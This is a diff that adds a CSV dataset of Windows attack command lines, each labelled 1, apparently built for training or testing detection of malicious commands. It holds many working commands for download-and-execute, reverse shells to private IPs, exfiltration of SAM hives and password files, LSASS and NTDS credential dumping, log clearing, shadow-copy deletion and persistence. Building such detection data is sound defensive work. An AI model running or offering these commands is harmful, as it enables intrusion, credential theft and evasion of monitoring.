@@ -1,0 +1,339 @@
+﻿lable,command
+1,"C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_[0-9]+\GfxDownloadWrapper.exe ""URL"" ""DESTINATION FILE"""
+1,C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddinUtil.exe -AddinRoot:.
+1,start ms-appinstaller://?source={REMOTEURL:.exe}
+1,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Applaunch.exe"" /activate ""{REMOTEURL}#APPLICATION_METADATA_HERE"""
+1,"C:\Windows\System32\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su {CMD}"
+1,ATBroker.exe /start malware
+1,"bash.exe -c ""{CMD}"""
+1,"bash.exe -c ""socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane"""
+1,bash.exe -c 'cat {PATH:.zip} > /dev/tcp/192.168.1.10/24'
+1,"bash.exe -c ""{CMD}"""
+1,bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset
+1,certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll}
+1,certoc.exe -GetCACAPS {REMOTEURL:.ps1}
+1,CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}
+1,CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE}
+1,certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}
+1,certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe}
+1,certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt
+1,cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat
+1,cmd.exe - < {PATH}:payload.bat
+1,cmstp.exe /ni /s {REMOTEURL:.inf}
+1,ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}
+1,ConfigSecurityPolicy.exe {REMOTEURL}
+1,conhost.exe {CMD}
+1,conhost.exe --headless {CMD}
+1,control.exe {PATH_ABSOLUTE}:evil.dll
+1,cscript //e:vbscript {PATH_ABSOLUTE}:script.vbs
+1,DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL}
+1,"set ""SYSTEMROOT=C:\Windows\Temp"" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr"
+1,"rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}"
+1,diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab
+1,diantz.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}
+1,diantz /f {PATH:.ddf}
+1,diskshadow> exec {PATH:.exe}
+1,dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}
+1,esentutl.exe /y {PATH_ABSOLUTE:.exe} /d {PATH_ABSOLUTE}:file.exe /o
+1,esentutl.exe /y {PATH_ABSOLUTE}:file.exe /d {PATH_ABSOLUTE:.exe} /o
+1,esentutl.exe /y {PATH_SMB:.exe} /d {PATH_ABSOLUTE}:file.exe /o
+1,esentutl.exe /y {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o
+1,esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d {PATH_ABSOLUTE:.dit}
+1,expand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat
+1,"explorer.exe /root,""{PATH_ABSOLUTE:.exe}"""
+1,explorer.exe {PATH_ABSOLUTE:.exe}
+1,Extexport.exe {PATH_ABSOLUTE:folder} foo bar
+1,extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe
+1,extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe
+1,findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe
+1,findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe
+1,findstr /S /I cpassword \\sysvol\policies\*.xml
+1,finger user@example.host.com | more +2 | cmd
+1,fltMC.exe unload SysmonDrv
+1,"forfiles /p c:\windows\system32 /m notepad.exe /c ""{CMD}"""
+1,"forfiles /p c:\windows\system32 /m notepad.exe /c ""{PATH_ABSOLUTE}:evil.exe"""
+1,fsutil.exe file setZeroData offset=0 length=9999999999 {PATH_ABSOLUTE}
+1,fsutil.exe usn deletejournal /d c:
+1,fsutil.exe file createnew {PATH_ABSOLUTE} {LENGTH_IN_BYTES}
+1,echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt
+1,"cmd.exe /c ""@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"""
+1,HH.exe {REMOTEURL:.bat}
+1,HH.exe {PATH_ABSOLUTE:.exe}
+1,HH.exe {REMOTEURL:.chm}
+1,C:\Windows\System32\IME\SHARED\IMEWDBLD.exe {REMOTEURL}
+1,"set windir=c:\test& cd ""C:\Program Files\Internet Explorer\"" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}"
+1,ieexec.exe {REMOTEURL:.exe}
+1,ieexec.exe {REMOTEURL:.exe}
+1,InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
+1,InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
+1,InstallUtil.exe {REMOTEURL}
+1,Ldifde -i -f {PATH:.ldf}
+1,makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab
+1,makecab {PATH_SMB:.exe} {PATH_ABSOLUTE}:file.cab
+1,makecab {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}
+1,MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll}
+1,Mavinject.exe 4172 /INJECTRUNNING {PATH_ABSOLUTE}:file.dll
+1,Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}
+1,Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}
+1,Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}
+1,mmc.exe -Embedding {PATH_ABSOLUTE:.msc}
+1,mmc.exe -Embedding {PATH_ABSOLUTE:.msc}
+1,MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}
+1,"copy ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe"" C:\Users\Public\Downloads\MP.exe && chdir ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\"" && ""C:\Users\Public\Downloads\MP.exe"" -DownloadFile -url {REMOTEURL:.exe} -path C:\Users\Public\Downloads\evil.exe"
+1,MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe
+1,"msbuild.exe /logger:TargetLogger,{PATH_ABSOLUTE:.dll};MyParameters,Foo"
+1,"msdt.exe /id PCWDiagnostic /skip force /param ""IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe"""
+1,"msedge.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&"""
+1,"mshta.exe vbscript:Close(Execute(""GetObject(""""script:{REMOTEURL:.sct}"""")""))"
+1,"mshta.exe javascript:a=GetObject(""script:{REMOTEURL:.sct}"").Exec();close();"
+1,"mshta.exe ""{PATH_ABSOLUTE}:file.hta"""
+1,mshta.exe {REMOTEURL}
+1,msiexec /q /i {REMOTEURL}
+1,msiexec /y {PATH_ABSOLUTE:.dll}
+1,msiexec /z {PATH_ABSOLUTE:.dll}
+1,"msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS=""{REMOTEURL:.mst}"" /qb"
+1,netsh.exe add helper {PATH_ABSOLUTE:.dll}
+1,ngen.exe {REMOTEURL}
+1,odbcconf /a {REGSVR {PATH_ABSOLUTE:.dll}}
+1,"odbcconf INSTALLDRIVER ""lolbas-project|Driver={PATH_ABSOLUTE:.dll}|APILevel=2""
+odbcconf configsysdsn ""lolbas-project"" ""DSN=lolbas-project""
+"
+1,pcalua.exe -a {PATH:.exe}
+1,pcalua.exe -a {PATH_SMB:.dll}
+1,pcalua.exe -a {PATH_ABSOLUTE:.cpl} -c Java
+1,Pcwrun.exe {PATH_ABSOLUTE:.exe}
+1,Pcwrun.exe /../../$(calc).exe
+1,Presentationhost.exe {PATH_ABSOLUTE:.xbap}
+1,Presentationhost.exe {REMOTEURL}
+1,print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}
+1,PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip}
+1,PrintBrm -r -f {PATH_ABSOLUTE}:hidden.zip -d {PATH_ABSOLUTE:folder}
+1,provlaunch.exe LOLBin
+1,rasautou -d {PATH:.dll} -p export_name -a a -e e
+1,reg export HKLM\SOFTWARE\Microsoft\Evilreg {PATH_ABSOLUTE}:evilreg.reg
+1,reg save HKLM\SECURITY {PATH_ABSOLUTE:.1.bak} && reg save HKLM\SYSTEM {PATH_ABSOLUTE:.2.bak} && reg save HKLM\SAM {PATH_ABSOLUTE:.3.bak}
+1,regedit /E {PATH_ABSOLUTE}:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
+1,regedit {PATH_ABSOLUTE}:regfile.reg
+1,regini.exe {PATH}:hidden.ini
+1,Register-cimprovider -path {PATH_ABSOLUTE:.dll}
+1,regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll
+1,regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll
+1,regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll
+1,regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll
+1,replace.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:folder} /A
+1,rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM
+1,rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM
+1,"rundll32.exe {PATH_SMB:.dll},EntryPoint"
+1,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:{REMOTEURL}"")"
+1,"rundll32 ""{PATH}:ADSDLL.dll"",DllMain"
+1,rundll32.exe -sta {CLSID}
+1,runexehelper.exe {PATH_ABSOLUTE:.exe}
+1,runscripthelper.exe surfacecheck \\?\{PATH_ABSOLUTE:.txt} {PATH_ABSOLUTE:folder}
+1,"sc create evilservice binPath=""\""c:\\ADS\\file.txt:cmd.exe\"" /c echo works > \""c:\ADS\works.txt\"""" DisplayName= ""evilservice"" start= auto\ & sc start evilservice"
+1,"sc config {ExistingServiceName} binPath=""\""c:\\ADS\\file.txt:cmd.exe\"" /c echo works > \""c:\ADS\works.txt\"""" & sc start {ExistingServiceName}"
+1,"schtasks /create /sc minute /mo 1 /tn ""Reverse shell"" /tr ""{CMD}"""
+1,"schtasks /create /s targetmachine /tn ""MyTask"" /tr ""{CMD}"" /sc daily"
+1,"scp.exe -o ProxyCommand=""{CMD}"" . localhost:."
+1,"scp.exe -S ""{CMD}"" . localhost:."
+1,"scp -o PKCS11Provider=""{PATH_SMB:.dll}"" . win@github.com:."
+1,Scriptrunner.exe -appvscript {PATH:.exe}
+1,ScriptRunner.exe -appvscript {PATH_SMB:.cmd}
+1,SettingSyncHost -LoadAndRunDiagScript {PATH:.exe}
+1,SettingSyncHost -LoadAndRunDiagScriptNoCab {PATH:.bat}
+1,"sftp -o ProxyCommand=""{CMD}"" ."
+1,"sftp -D ""{CMD}"""
+1,"ssh -o ProxyCommand=""{CMD}"" ."
+1,"ssh -o PKCS11Provider=""\\\\127.0.0.1\\Temp\\example.dll"" win@github.com"
+1,"SyncAppvPublishingServer.exe ""n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"""
+1,tar -cf {PATH}:ads {PATH_ABSOLUTE:folder}
+1,tar -xf {PATH}:ads
+1,"TTDInject.exe /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /Launch ""{PATH:.exe}"""
+1,"ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /launch ""{PATH:.exe}"""
+1,tttracer.exe {PATH_ABSOLUTE:.exe}
+1,"rmdir %temp%\lolbin /s /q 2>nul & mkdir ""%temp%\lolbin\Windows Media Player"" & copy C:\Windows\System32\calc.exe ""%temp%\lolbin\Windows Media Player\wmpnscfg.exe"" >nul && cmd /V /C ""set ""ProgramW6432=%temp%\lolbin"" && unregmp2.exe /HideWMP"""
+1,vssadmin delete shadows /all /quiet
+1,"wbadmin start backup -backupTarget:{PATH_ABSOLUTE:folder} -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet"
+1,"wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -notRestoreAcl -quiet"
+1,wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u {PATH:.exe}
+1,"wmic.exe process call create ""{PATH_ABSOLUTE}:program.exe"""
+1,"wmic.exe process call create ""{CMD}"""
+1,"wmic.exe /node:""192.168.0.1"" process call create ""{CMD}"""
+1,"wmic.exe process get brief /format:""{REMOTEURL:.xsl}"""
+1,"wmic.exe process get brief /format:""{PATH_SMB:.xsl}"""
+1,"wmic.exe datafile where ""Name='C:\\windows\\system32\\calc.exe'"" call Copy ""C:\\users\\public\\calc.exe"""
+1,wscript //e:vbscript {PATH}:script.vbs
+1,"echo GetObject(""script:{REMOTEURL:.js}"") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js"
+1,wuauclt.exe /UpdateDeploymentProvider {PATH_ABSOLUTE:.dll} /RunHandlerComServer
+1,xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}
+1,xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}
+1,xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z{REMOTEURL}
+1,"C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&"""
+1,"msedgewebview2.exe --no-sandbox --browser-subprocess-path=""{PATH_ABSOLUTE:.exe}"""
+1,"msedgewebview2.exe --utility-cmd-prefix=""{CMD}"""
+1,"msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher=""{CMD}"""
+1,"msedgewebview2.exe --no-sandbox --renderer-cmd-prefix=""{CMD}"""
+1,wt.exe {CMD}
+1,"rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,"
+1,"rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},,1,"
+1,"rundll32.exe advpack.dll,RegisterOCX {PATH:.dll}"
+1,"rundll32.exe advpack.dll,RegisterOCX {PATH:.exe}"
+1,"rundll32 advpack.dll, RegisterOCX {CMD}"
+1,"rundll32.exe desk.cpl,InstallScreenSaver {PATH_ABSOLUTE:.scr}"
+1,"rundll32.exe desk.cpl,InstallScreenSaver {PATH_SMB:.scr}"
+1,"rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}"
+1,"rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},DefaultInstall_SingleUser,1,"
+1,"rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},,1,"
+1,"rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.dll}"
+1,"rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.exe}"
+1,"rundll32 ieadvpack.dll, RegisterOCX {CMD}"
+1,"rundll32.exe Mshtml.dll,PrintHTML {PATH_ABSOLUTE:.hta}"
+1,"rundll32.exe pcwutl.dll,LaunchApplication {PATH:.exe}"
+1,"rundll32.exe ""C:\Program Files\Windows Photo Viewer\PhotoViewer.dll"",ImageView_Fullscreen {REMOTEURL}"
+1,"rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}"
+1,"rundll32.exe shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}"
+1,"rundll32.exe shell32.dll,ShellExec_RunDLL {PATH:.exe}"
+1,"rundll32 SHELL32.DLL,ShellExec_RunDLL {PATH:.exe} {CMD:args}"
+1,"rundll32.exe shell32.dll,#44 {PATH:.dll}"
+1,"rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}"
+1,"rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.hta}"
+1,"rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e"
+1,"rundll32.exe url.dll,FileProtocolHandler {PATH_ABSOLUTE:.exe}"
+1,"rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e"
+1,"rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta"
+1,"rundll32.exe zipfldr.dll,RouteTheCall {PATH:.exe}"
+1,"rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e"
+1,rundll32 C:\windows\system32\comsvcs.dll MiniDump {LSASS_PID} dump.bin full
+1,"powershell.exe -ep bypass -command ""set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\..\..\..\testing\fun.dll;[Program]::Fun()"""
+1,. C:\Windows\diagnostics\system\AERO\CL_Mutexverifiers.ps1   \nrunAfterCancelProcess {PATH:.ps1}
+1,. C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1   \nSyncInvoke {CMD}
+1,powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe}
+1,"powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsInstallationPath ""/../../../../../; {PATH:.exe} ;"""
+1,set comspec={PATH_ABSOLUTE:.exe} & cscript c:\windows\system32\manage-bde.wsf
+1,copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf
+1,pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}
+1,"SyncAppvPublishingServer.vbs ""n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"""
+1,"powershell.exe -ep bypass -command ""set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()"""
+1,"winrm invoke Create wmicimv2/Win32_Process @{CommandLine=""{CMD}""} -r:http://target:5985"
+1,"winrm invoke Create wmicimv2/Win32_Service @{Name=""Evil"";DisplayName=""Evil"";PathName=""{CMD}""} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985"
+1,%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty
+1,"Pester.bat [/help|?|-?|/?] ""$null; {CMD}"""
+1,Pester.bat ;{PATH:.exe}
+1,"AccCheckConsole.exe -window ""Untitled - Notepad"" {PATH_ABSOLUTE:.dll}"
+1,"AccCheckConsole.exe -window ""Untitled - Notepad"" {PATH_ABSOLUTE:.dll}"
+1,adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet
+1,"AgentExecutor.exe -powershell ""{PATH_ABSOLUTE:.ps1}"" ""{PATH_ABSOLUTE:.1.log}"" ""{PATH_ABSOLUTE:.2.log}"" ""{PATH_ABSOLUTE:.3.log}"" 60000 ""{PATH_ABSOLUTE:folder}"" 0 1"
+1,AppLauncher.exe {PATH_ABSOLUTE:.exe}
+1,AppVLP.exe {PATH_SMB:.bat}
+1,"AppVLP.exe powershell.exe -c ""$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)"""
+1,"bcp ""SELECT payload_data FROM database.dbo.payloads WHERE id=1"" queryout ""C:\Windows\Temp\payload.exe"" -S localhost -T -c"
+1,cdb.exe -cf {PATH:.wds} -o notepad.exe
+1,"cdb.exe -pd -pn {process_name}
+.shell {CMD}
+"
+1,"cdb.exe -c {PATH:.txt} ""{CMD}"""
+1,coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name
+1,coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name
+1,dbgsrv.exe -t tcp:port=5005 -c {CMD}
+1,"dbgsrv.exe -t tcp:clicon={HOST},port={PORT}"
+1,"DefaultPack.EXE /C:""{CMD}"""
+1,devinit.exe run -t msi-install -i {REMOTEURL:.msi}
+1,"devtoolslauncher.exe LaunchForDeploy {PATH_ABSOLUTE:.exe} ""{CMD:args}"" test"
+1,"devtoolslauncher.exe LaunchForDebug {PATH_ABSOLUTE:.exe} ""{CMD:args}"" test"
+1,"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""create"" ""quit"" ""quit"""
+1,"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""mount {GUID}"" ""quit"" ""quit"""
+1,"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""delete {GUID}"" ""quit"" ""quit"""
+1,"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""create"" ""list all"" ""mount 1"" ""quit"" ""quit"""
+1,"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""list all"" ""delete 1"" ""quit"" ""quit"""
+1,Dxcap.exe -c {PATH_ABSOLUTE:.exe}
+1,"IntelliTrace.exe launch /cp:""collectionplan.xml"" /f:""c:\users\public\log"" ""C:\Windows\System32\calc.exe"""
+1,"logger.exe RUN ""{CMD}"""
+1,"logger.exe RUNW ""{CMD}"""
+1,"logger.exe ""{CMD}"""
+1,Mftrace.exe {PATH:.exe}
+1,Microsoft.NodejsTools.PressAnyKey.exe normal 1 {PATH:.exe}
+1,mpiexec.exe {CMD}
+1,"mscopilot.exe --no-startup-window --disable-gpu-sandbox --gpu-launcher=""{CMD} && taskkill /f /im mscopilot.exe &&"""
+1,"mscopilot_proxy.exe --no-startup-window --disable-gpu-sandbox --gpu-launcher=""cmd.exe /c calc.exe && taskkill /f /im mscopilot.exe &&"""
+1,"msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""{PATH_ABSOLUTE:.bat}"""
+1,"msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""{PATH_ABSOLUTE:.bat}"""
+1,msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl}
+1,msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml}
+1,msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}
+1,msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name
+1,"ntdsutil.exe ""ac i ntds"" ""ifm"" ""create full c:\"" q q"
+1,ntsd.exe -g {CMD}
+1,OpenConsole.exe {PATH:.exe}
+1,pixtool.exe launch {PATH_ABSOLUTE:.exe}
+1,procdump.exe -md {PATH:.dll} explorer.exe
+1,procdump.exe -md {PATH:.dll} foobar
+1,Remote.exe /s {PATH:.exe} anythinghere
+1,Remote.exe /s {PATH:.exe} anythinghere
+1,Remote.exe /s {PATH_SMB:.exe} anythinghere
+1,SQLToolsPS.exe -noprofile -command Start-Process {PATH:.exe}
+1,"teams.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&"""
+1,TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000
+1,Tracker.exe /d {PATH:.dll} /c C:\Windows\write.exe
+1,Tracker.exe /d {PATH:.dll} /c C:\Windows\write.exe
+1,VSDiagnostics.exe start 1 /launch:{PATH:.exe}
+1,"VSDiagnostics.exe start 2 /launch:{PATH:.exe} /launchArgs:""{CMD:args}"""
+1,"VSIISExeLauncher.exe -p {PATH:.exe} -a ""{CMD:args}"""
+1,VSLaunchBrowser.exe .exe {REMOTEURL:.exe}
+1,VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe}
+1,VSLaunchBrowser.exe .exe {PATH_SMB}
+1,vshadow.exe -nw -exec={PATH_ABSOLUTE:.exe} C:
+1,Vsjitdebugger.exe {PATH:.exe}
+1,windbg.exe -g {CMD}
+1,"wsb start --config ""<Configuration><LogonCommand><Command>{CMD}</Command></LogonCommand></Configuration>""
+wsb exec -r System --id YOUR_ID
+"
+1,"wsb start --config ""<Configuration><MappedFolders><MappedFolder><HostFolder>{PATH_ABSOLUTE:folder}</HostFolder><ReadOnly>false</ReadOnly></MappedFolder></MappedFolders></Configuration>""
+wsb exec -r System --id YOUR_ID -c ""cmd.exe /c copy C:\users\WDAGUtilityAccount\Desktop\Temp\{PATH} {PATH}""
+"
+1,"wsb start
+wsb share --id YOUR_ID -f {PATH_ABSOLUTE:folder} -s c:\SOME_FOLDER --allow-write
+wsb exec -r System --id YOUR_ID -c ""cmd.exe /c copy {PATH_ABSOLUTE} c:\SOME_FOLDER""
+"
+1,wsl.exe -e /mnt/c/Windows/System32/calc.exe
+1,wsl.exe -u root -e cat /etc/shadow
+1,"wsl.exe --exec bash -c ""{CMD}"""
+1,wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
+1,"xbootmgr.exe -trace ""{boot|hibernate|standby|shutdown|rebootCycle}"" -callBack {PATH:.exe}"
+1,"xbootmgr.exe -trace ""{boot|hibernate|standby|shutdown|rebootCycle}"" -preTraceCmd {PATH:.exe}"
+1,xbootmgrsleep.exe 1000 {PATH:.exe}
+1,dotnet-counters.exe collect --duration 1 -- {PATH:.exe}
+1,dotnet-trace.exe collect --duration 00:00:01 -- {PATH:.exe}
+1,vsls-agent.exe --agentExtensionPath {PATH_ABSOLUTE:.dll}
+1,winfile.exe {PATH:.exe}
+1,"curl.exe -X POST -F ""data=@C:\Windows\System32\config\SAM"" http://192.168.1.50:8080/upload"
+1,curl.exe -k -L https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/bin/calc.exe -o C:\Temp\calc.exe
+1,"curl.exe -O http://192.168.1.50/beacon.dll & rundll32.exe beacon.dll,Start"
+1,"net stop ""Windows Defender Antivirus Service"""
+1,wevtutil cl Security
+1,wevtutil cl System
+1,wevtutil cl Application
+1,"wevtutil cl ""Windows PowerShell"""
+1,"wevtutil cl ""Microsoft-Windows-Sysmon/Operational"""
+1,wevtutil sl Security /e:false
+1,xcopy /s /h /e C:\Users\Administrator\Documents\*.kdbx \\192.168.1.50\staging
+1,"xcopy /s /h /e ""C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles"" C:\Users\Public\Profiles"
+1,"python.exe -c ""import socket,subprocess,os;s=socket.socket();s.connect((\""192.168.1.50\"",4444));os.dup2(s.fileno(),0);subprocess.call([\""cmd.exe\""])"""
+1,"python.exe -c ""import urllib.request;exec(urllib.request.urlopen(\""http://192.168.1.50/payload.py\"").read())"""
+1,"python.exe -c ""import base64;exec(base64.b64decode(\""aW1wb3J0IG9zO29zLnN5c3RlbSgnY2FsYy5leGUnKQ==\""))"""
+1,"git.exe clone http://192.168.1.50/repo.git --config core.pager=""cmd.exe /c calc.exe"""
+1,"git.exe -c core.fsmonitor=""cmd.exe /c calc.exe"" status"
+1,"git.exe help config -a --paginate=""cmd.exe /c calc.exe"""
+1,fsutil usn deletejournal /D C:
+1,certutil.exe -urlcache -split -f http://192.168.1.50/beacon.exe C:\Windows\Temp\beacon.exe
+1,certutil.exe -decode C:\Windows\Temp\calc.txt C:\Windows\Temp\calc.exe
+1,certutil.exe -urlcache -split -f http://192.168.1.50/test.ps1 C:\Windows\Temp:hidden.ps1
+1,bitsadmin /create backdoor & bitsadmin /addfile backdoor http://192.168.1.50/payload.exe C:\Users\Public\payload.exe & bitsadmin /setnotifycmdline backdoor C:\Users\Public\payload.exe NULL & bitsadmin /resume backdoor
+1,"wmic process call create ""cmd.exe /c calc.exe"""
+1,"wmic /node:192.168.1.50 /user:admin /password:P@ss process call create ""calc.exe"""
+1,wmic shadowcopy delete
+1,"wmic os get /format:""http://192.168.1.50/payload.xsl"""
+1,"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Run"" /v Backdoor /t REG_SZ /d ""C:\Users\Public\backdoor.exe"" /f"
+1,reg save HKLM\SAM C:\Users\Public\sam.save & reg save HKLM\SYSTEM C:\Users\Public\system.save
+1,"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"" /v Debugger /t REG_SZ /d ""cmd.exe"" /f"
+1,"schtasks /create /tn ""SecurityUpdate"" /tr ""cmd.exe /c C:\Users\Public\payload.exe"" /sc onlogon /ru ""SYSTEM"""
+1,"sc create BackdoorService binPath= ""C:\Users\Public\backdoor.exe"" start= auto"
+1,"sc config TrustedService binpath= ""cmd.exe /k C:\Users\Public\backdoor.exe"""
